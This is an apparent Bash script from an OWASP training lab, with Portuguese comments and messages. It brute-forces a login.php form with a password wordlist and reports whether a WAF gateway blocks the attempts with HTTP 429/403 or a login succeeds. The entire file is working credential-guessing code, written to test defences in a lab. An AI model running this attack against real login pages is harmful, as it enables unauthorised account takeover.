#!/usr/bin/env bash
# ============================================================
# Vulnbox Lab — Ataque: Força Bruta (A07)
# Testa ausência de proteção contra tentativas repetidas de login
# ============================================================

TARGET="${TARGET:-http://owasp-lab-sentinel-gateway}"
USERNAME="${1:-user1}"
WORDLIST="${2:-/attacks/wordlist.txt}"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'

if [ ! -f "$WORDLIST" ]; then
    WORDLIST="wordlist.txt"
fi

if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}Arquivo de wordlist não encontrado: ${WORDLIST}${RST}"
    exit 1
fi

TOTAL_PASSWORDS=$(grep -c -v '^[[:space:]]*$' "$WORDLIST")

echo -e "\n${BLD}${CYN}════════════════════════════════════════════════${RST}"
echo -e "${BLD}  🔴 ATAQUE: Força Bruta — OWASP A07${RST}"
echo -e "${CYN}════════════════════════════════════════════════${RST}"
echo -e "  Alvo       : ${TARGET}/login.php"
echo -e "  Usuário    : ${USERNAME}"
echo -e "  Wordlist   : ${WORDLIST} (${TOTAL_PASSWORDS} senhas)"
echo -e "${CYN}────────────────────────────────────────────────${RST}\n"

BLOCKED=0
SUCCESS=0
ATTEMPT=0

while IFS= read -r PASS || [ -n "$PASS" ]; do
    # Ignora linhas em branco e comentários
    [[ -z "$PASS" || "$PASS" =~ ^[[:space:]]*# ]] && continue

    ATTEMPT=$((ATTEMPT + 1))
    
    RESP=$(curl -s -w "\n%{http_code}" \
        -X POST "${TARGET}/login.php" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${USERNAME}&password=${PASS}" \
        --max-time 5 2>/dev/null)
    
    HTTP_CODE=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | head -n -1)

    if [ "$HTTP_CODE" = "429" ]; then
        echo -e "  Tentativa ${BLD}${ATTEMPT}${RST}: ${USERNAME}/${PASS} → ${RED}HTTP 429 — BLOQUEADO PELO WAF 🛡️${RST}"
        BLOCKED=1
        break
    elif [ "$HTTP_CODE" = "403" ]; then
        echo -e "  Tentativa ${BLD}${ATTEMPT}${RST}: ${USERNAME}/${PASS} → ${RED}HTTP 403 — BLOQUEADO PELO WAF 🛡️${RST}"
        BLOCKED=1
        break
    elif [ "$HTTP_CODE" = "200" ]; then
        if echo "$BODY" | grep -qi "dashboard\|bem-vindo\|logout\|sucesso"; then
            echo -e "  Tentativa ${BLD}${ATTEMPT}${RST}: ${USERNAME}/${PASS} → ${GRN}HTTP 200 — LOGIN BEM-SUCEDIDO ✅${RST}"
            SUCCESS=1
            break
        else
            echo -e "  Tentativa ${BLD}${ATTEMPT}${RST}: ${USERNAME}/${PASS} → ${YLW}HTTP 200 — falha (ainda no login)${RST}"
        fi
    else
        echo -e "  Tentativa ${BLD}${ATTEMPT}${RST}: ${USERNAME}/${PASS} → HTTP ${HTTP_CODE}"
    fi

    sleep 0.3
done < "$WORDLIST"

echo -e "\n${CYN}────────────────────────────────────────────────${RST}"
if [ $BLOCKED -eq 1 ]; then
    echo -e "  ${GRN}${BLD}RESULTADO: WAF BLOQUEOU o ataque ✅${RST}"
    echo -e "  Gateway detectou força bruta e retornou 429/403"
elif [ $SUCCESS -eq 1 ]; then
    echo -e "  ${RED}${BLD}RESULTADO: VULNERÁVEL — Login descoberto ⚠️${RST}"
else
    echo -e "  ${RED}${BLD}RESULTADO: VULNERÁVEL — Sem bloqueio após ${ATTEMPT} senhas testadas ⚠️${RST}"
    echo -e "  Sem WAF ativo, um atacante testaria toda a wordlist"
fi
echo -e "${CYN}════════════════════════════════════════════════${RST}\n"
